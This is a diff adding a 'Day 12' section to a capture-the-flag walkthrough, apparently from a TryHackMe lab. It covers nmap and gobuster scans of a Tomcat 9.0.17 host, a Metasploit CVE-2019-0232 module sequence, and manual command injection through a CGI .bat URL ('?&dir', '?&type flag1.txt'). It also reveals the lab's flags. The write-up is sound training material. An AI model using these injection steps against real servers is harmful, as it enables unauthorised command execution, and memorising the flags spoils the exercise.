@@ -695,6 +695,101 @@ Keyring folder: /usr/share/keyrings
 * Now we can `cd /root/` and `cat flag.txt` to get the flag: `thm{2fb10afe933296592}`
 
 # Day 12
+### IP
+`10.10.72.67`
+
+### nmap
+`nmap -sC -sV 10.10.72.67 -oN initial.nmap`
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 11:22 EST
+Nmap scan report for 10.10.72.67
+Host is up (0.16s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE            VERSION
+3389/tcp open  ssl/ms-wbt-server?
+5357/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8009/tcp open  ajp13              Apache Jserv (Protocol v1.3)
+8080/tcp open  http               Apache Tomcat 9.0.17
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 185.51 seconds
+```
+* Apache has a webserver running on 8080
+	* This shows us that its apache tomcat 9.0.17
+### gobuster
+`gobuster dir -u http://10.10.72.67:8080/ -w /usr/share/wordlists/dirb/common.txt`
+```
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.72.67:8080/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/23 11:30:32 Starting gobuster
+
+===============================================================
+/docs (Status: 302)
+/examples (Status: 302)
+/favicon.ico (Status: 200)
+/manager (Status: 302)
+===============================================================
+2020/12/23 11:31:55 Finished
+===============================================================
+```
+### metasploit
+* Now, I totally would have used metasploit for this, but the machine kept dying on me
+```
+1. msfconsole
+2. search 2019-0232
+3. use exploit/windows/http/tomcat_cgi_cmdlineargs
+4. options
+5. set RHOST 10.10.72.67
+6. set LHOST tun0
+7. run
+8. ls
+9. cat flag1.txt
+```
+### manual
+* We know that ElfMcEager made a file called `elfwhacker.bat`
+	* This is probably in the `/cgi-bin/` directory
+	* We know the machine is probably windows since it's a `.bat` file
+* Going to `http://10.10.72.67:8080/cgi-bin/elfwhacker.bat` shows us the output of his script
+	* That means we can go to `http://10.10.72.67:8080/cgi-bin/elfwhacker.bat?&dir` to append the output of the `dir command`
+
+* I opened burpsuite and turned on my proxy to intercept the request being made when this is sent to make it easier to play with commands
+	* The following was my intercepted request:
+```
+GET /cgi-bin/elfwhacker.bat?&dir HTTP/1.1
+
+Host: 10.10.72.67:8080
+
+Cache-Control: max-age=0
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9,ca;q=0.8
+
+Connection: close
+```
+* We can press `CTRL+R` to send to the repeater tab
+
+* Clicking send shows us a file called `flag1.txt` in the same directory
+* We can output that file by writing `GET /cgi-bin/elfwhacker.bat?&type flag1.txt HTTP/1.1` and then highlighting it before pressing `CTRL+U` to url encode it
+	* This gives us the line: `GET /cgi-bin/elfwhacker.bat?&type+flag1.txt HTTP/1.1`
+	* When clicking send, it gives us the flag: `thm{whacking_all_the_elves}`
+
 
 # Day 13
 
